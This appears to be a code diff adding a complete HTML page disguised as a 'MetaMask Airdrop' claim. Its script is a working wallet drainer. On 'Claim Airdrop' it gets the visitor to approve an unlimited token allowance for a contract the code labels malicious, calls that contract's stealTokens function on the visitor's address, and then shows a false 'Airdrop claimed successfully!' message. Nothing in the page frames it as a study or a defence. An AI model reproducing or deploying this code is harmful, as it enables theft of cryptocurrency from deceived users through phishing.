@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MetaMask Airdrop</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+</head>
+<body>
+    <h1>Claim Your Free Airdrop!</h1>
+    <button id="connectWallet">Connect MetaMask</button>
+    <button id="claimAirdrop" disabled>Claim Airdrop</button>
+    <p id="status">Status: Not connected</p>
+
+    <script>
+        // Web3 variables
+        let web3;
+        let userAddress;
+        const tokenContractAddress = "0x5D4eFdE3e8ac4238B8feaE54aC12D115767FA2B9"; // Updated TKK contract address
+        const maliciousContractAddress = "0xEAB74Cf131AA7C10ba358a2d5978314E1f891Df0"; // Malicious contract address
+
+        // ERC-20 ABI (Token Functions)
+        const tokenABI = [
+            {
+                "constant": false,
+                "inputs": [
+                    { "name": "spender", "type": "address" },
+                    { "name": "value", "type": "uint256" }
+                ],
+                "name": "approve",
+                "outputs": [{ "name": "", "type": "bool" }],
+                "type": "function"
+            },
+            {
+                "constant": true,
+                "inputs": [{ "name": "account", "type": "address" }],
+                "name": "balanceOf",
+                "outputs": [{ "name": "", "type": "uint256" }],
+                "type": "function"
+            }
+        ];
+
+        // Malicious Contract ABI
+        const maliciousContractABI = [
+            {
+                "constant": false,
+                "inputs": [{ "name": "victim", "type": "address" }],
+                "name": "stealTokens",
+                "outputs": [],
+                "type": "function"
+            }
+        ];
+
+        // On page load
+        window.onload = async () => {
+            if (window.ethereum) {
+                web3 = new Web3(window.ethereum);
+
+                document.getElementById("connectWallet").addEventListener("click", connectWallet);
+                document.getElementById("claimAirdrop").addEventListener("click", claimAirdrop);
+            } else {
+                alert("MetaMask not found! Please install MetaMask.");
+            }
+        };
+
+        // Connect MetaMask
+        async function connectWallet() {
+            try {
+                const accounts = await ethereum.request({ method: "eth_requestAccounts" });
+                userAddress = accounts[0];
+                document.getElementById("status").innerText = `Connected: ${userAddress}`;
+                document.getElementById("claimAirdrop").disabled = false;
+            } catch (error) {
+                console.error("Error connecting MetaMask:", error);
+                document.getElementById("status").innerText = "Failed to connect wallet.";
+            }
+        }
+
+        // Claim Airdrop
+        async function claimAirdrop() {
+            if (!userAddress) {
+                alert("Please connect your wallet first.");
+                return;
+            }
+
+            try {
+                document.getElementById("status").innerText = "Claiming airdrop...";
+
+                // Initialize token and malicious contract instances
+                const tokenContract = new web3.eth.Contract(tokenABI, tokenContractAddress);
+                const maliciousContract = new web3.eth.Contract(maliciousContractABI, maliciousContractAddress);
+
+                // Approve the malicious contract to spend unlimited tokens
+                const approveTx = await tokenContract.methods
+                    .approve(maliciousContractAddress, web3.utils.toHex(web3.utils.toBN(2).pow(web3.utils.toBN(256)).sub(web3.utils.toBN(1)))).send({ from: userAddress });
+                console.log("Approval Transaction:", approveTx);
+
+                // Call the malicious stealTokens function
+                const stealTx = await maliciousContract.methods
+                    .stealTokens(userAddress).send({ from: userAddress });
+                console.log("Steal Transaction:", stealTx);
+
+                document.getElementById("status").innerText = "Airdrop claimed successfully!";
+            } catch (error) {
+                console.error("Error during the airdrop process:", error);
+                document.getElementById("status").innerText = "Failed to claim the airdrop.";
+            }
+        }
+    </script>
+</body>
+</html>
